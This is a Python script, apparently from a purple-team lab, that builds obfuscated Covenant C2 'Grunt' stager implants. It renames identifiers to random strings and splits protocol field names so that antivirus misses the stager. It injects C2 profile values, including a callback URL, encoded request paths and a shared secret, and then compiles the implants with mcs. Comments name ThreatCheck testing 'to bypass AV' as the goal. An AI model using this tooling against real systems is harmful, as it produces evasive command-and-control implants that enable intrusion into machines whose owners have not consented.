# Covenant Binary stager obfuscator 
# Modified by thepcn3rd 2021
# Reference to below for the original script...
# @operat_or - Jack
# 22/12/2019
#
# 1. In Covenant build a custom HTTP profile
# 2. Build a Custom HTTP Template with the output from the stager and executor Template
# 3. Use the compiled versions to test with ThreatCheck to bypass AV
# 4. Verify a domain name is utilized (Set /etc/hosts if necessary)
# 5. The mono compiler will fail to compile the executor CS file

import argparse
import string
import random
import os

def obfuscate(f):
    #print(f)
    letters = string.ascii_lowercase
    # Replacement of terms
    gruntReplace = ''.join(random.choice(letters) for i in range(12))
    covenantReplace = ''.join(random.choice(letters) for i in range(12))
    stageReplace = ''.join(random.choice(letters) for i in range(12))
    decryptedAssemblyReplace = ''.join(random.choice(letters) for i in range(12))
    gruntAssemblyReplace = ''.join(random.choice(letters) for i in range(12))
    messageBytesReplace = ''.join(random.choice(letters) for i in range(12))
    # Execution of replacement
    newStager = f.replace("Grunt", gruntReplace)
    newStager = newStager.replace("Covenant", covenantReplace)
    newStager = newStager.replace("Stage", stageReplace)
    newStager = newStager.replace("DecryptedAssembly", decryptedAssemblyReplace)
    newStager = newStager.replace("gruntAssembly", gruntAssemblyReplace)
    newStager = newStager.replace("messageBytes", messageBytesReplace)

    msgFormatString='{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";'
    newFormatString='{{""---G-U-I-----D"":""{0}"",""T----y-p-----e"":{1},""---M-e-t----a"":""{2}"",""---I---V---"":""{3}"",""---E--n---cry---pt-e-d-M-e---ss---a-g-e"":""{4}"",""---H-----M--A--C"":""{5}""}}".Replace("-","");'
    newStager = newStager.replace(msgFormatString, newFormatString)
    #newStager = f
    return newStager

def addValues(f):
    # Values are pulled from the code after a launcher for a binary is generated.
    newStager = f.replace("{{REPLACE_COVENANT_URIS}}", "http://somedomain.com:80")
    newStager = newStager.replace("{{REPLACE_COVENANT_CERT_HASH}}", "")
    newStager = newStager.replace("{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}", "VXNlci1BZ2VudA==")
    newStager = newStager.replace("{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}", "TW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2Ojg1LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvODUuMA==")
    newStager = newStager.replace("{{REPLACE_PROFILE_HTTP_URLS}}", "L3dwLWluY2x1ZGVzL3JvYm90cy5odG1sP3BsYWNlPXtHVUlEfSZ2PTI=,L3dwLWluY2x1ZGVzL2ltYWdlcy5odG1sP3BsYWNlPXtHVUlEfQ==,L3dwLWluY2x1ZGVzL2RlcGxveS5odG1sP3BsYWNlPXtHVUlEfQ==")
    newStager = newStager.replace("{{REPLACE_PROFILE_HTTP_POST_REQUEST}}", "info=2wse4rft56yh7uj8ik9ol&definition={0}&session=55db-95b1-255e4e9afbe58696-3205555")
    newStager = newStager.replace("{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}", "<html><head><title>API Call</title></head><body><p>API Call</p>// API Call {0}</body></html>")
    newStager = newStager.replace("{{REPLACE_VALIDATE_CERT}}", "false")
    newStager = newStager.replace("{{REPLACE_USE_CERT_PINNING}}", "false")
    newStager = newStager.replace("{{REPLACE_GRUNT_GUID}}", "4f3403a5ea")
    newStager = newStager.replace("{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}", "kESZ0g0t7JyVQHtlMGPuJwiiP95i+4+EM4zrShY2xzY=")
    newStager = newStager.replace("{{REPLACE_DELAY}}", "7")
    newStager = newStager.replace("{{REPLACE_JITTER_PERCENT}}", "7")
    newStager = newStager.replace("{{REPLACE_CONNECT_ATTEMPTS}}", "4137")
    newStager = newStager.replace("{{REPLACE_KILL_DATE}}", "1612821570")
    newStager = newStager.replace("{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}", "<html><head><title>API Call</title></head><body><p>API Call</p>// API Call {0}</body></html>")
    newStager = newStager.replace("// {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}", "public static class MessageTransform { public static string Transform(byte[] bytes) { return System.Convert.ToBase64String(bytes); } public static byte[] Invert(string str) { return System.Convert.FromBase64String(str); } }")
    return newStager


class FileInfo:
    def __init__(self, stagerGrunt, executorGrunt, stagerCodeTemplate, executorCodeTemplate):
        self.stagerGrunt = stagerGrunt
        self.executorGrunt = executorGrunt
        self.stagerCodeTemplate = stagerCodeTemplate
        self.executorCodeTemplate = executorCodeTemplate

# The stagerGrunt.cs is the same as stagerCodeTemplate.cs however in the logic of the application below the Template does not get compiled.
# The executorGrunt.cs is the same as the executorCodeTemplate.cs
files = FileInfo("stagerGrunt.cs", "executorGrunt.cs", "stagerCodeTemplate.cs", "executorCodeTemplate.cs")

originalFilePath = "/home/thepcn3rd/Q1-Purple/gruntCS/originalFiles/"
modifiedFilePath = "/home/thepcn3rd/Q1-Purple/gruntCS/modifiedFiles/"
compiledFilePath = "/home/thepcn3rd/Q1-Purple/gruntCS/compiledFiles/"
filesList = [files.stagerGrunt, files.executorGrunt, files.stagerCodeTemplate, files.executorCodeTemplate]
for i in filesList:
    currentFile = originalFilePath + i
    modifiedFile = modifiedFilePath + "mod-" + i
    compiledFile = compiledFilePath + "comp-" + i + ".exe"
    currentStagerFile = open(currentFile).read()
    if os.path.isfile(modifiedFile):
        os.system('rm -f ' + modifiedFile)
    modifiedStagerFile = open(modifiedFile, "w")
    #newStagerInfo = obfuscate(currentStagerFile)
    newStagerInfo = currentStagerFile
    modifiedStagerFile.write(newStagerInfo)
    modifiedStagerFile.close()
    if "Grunt" in i:
        modifiedGruntFile = open(modifiedFile).read()
        modGruntFile = open(modifiedFile, "w")
        newGruntInfo = addValues(modifiedGruntFile)
        modGruntFile.write(newGruntInfo)
        modGruntFile.close()
    if os.path.isfile(compiledFile):
        os.system("rm -f " + compiledFile)
    if "Template" not in compiledFile:
        os.system('mcs -out:' + compiledFile + " " + modifiedFile)
print("[+] Done")
